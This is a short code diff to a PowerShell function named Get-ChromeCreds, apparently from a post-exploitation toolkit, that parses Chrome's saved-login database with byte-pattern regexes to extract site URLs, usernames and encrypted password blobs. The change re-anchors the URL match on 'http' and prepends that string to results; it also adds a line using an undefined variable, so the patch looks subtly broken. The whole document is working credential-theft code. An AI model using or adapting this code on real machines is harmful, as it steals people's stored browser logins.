@@ -46,7 +46,7 @@ function Get-ChromeCreds() {
 	}
 
 	# Now the magic bytes for URLs/Users. Look behind here is the look ahead for passwords.
-	$UserRegex = [Regex] '(?<=\x0D\x0D\x0D[\s\S]\x08)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)'
+	$UserRegex = [Regex] '(?<=\x0D\x0D\x0D[\s\S]{2}\x68\x74\x74\x70)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)'
 	$UserMatches = $UserRegex.Matches($BinaryText)
 	$UserNum = 0
 	$UserMatchCount = $UserMatches.Count
@@ -60,10 +60,14 @@ function Get-ChromeCreds() {
 	Write-Error $Mismatch
 	}
 	
+	# Add back the "http" used in the regex lookahead
+	$HTTP = "http"
 	# Put the URL/User matches into an array
 	Foreach ($User in $UserMatches) {
 		$User = $Encoding.GetBytes($UserMatches[$UserNum])
+		$User = $HTTPEnc + $User
 		$UserString = [System.Text.Encoding]::Default.GetString($User)
+		$UserString = $HTTP + $UserString
 		$UserArray += $UserString
 		$UserNum += 1
 	}
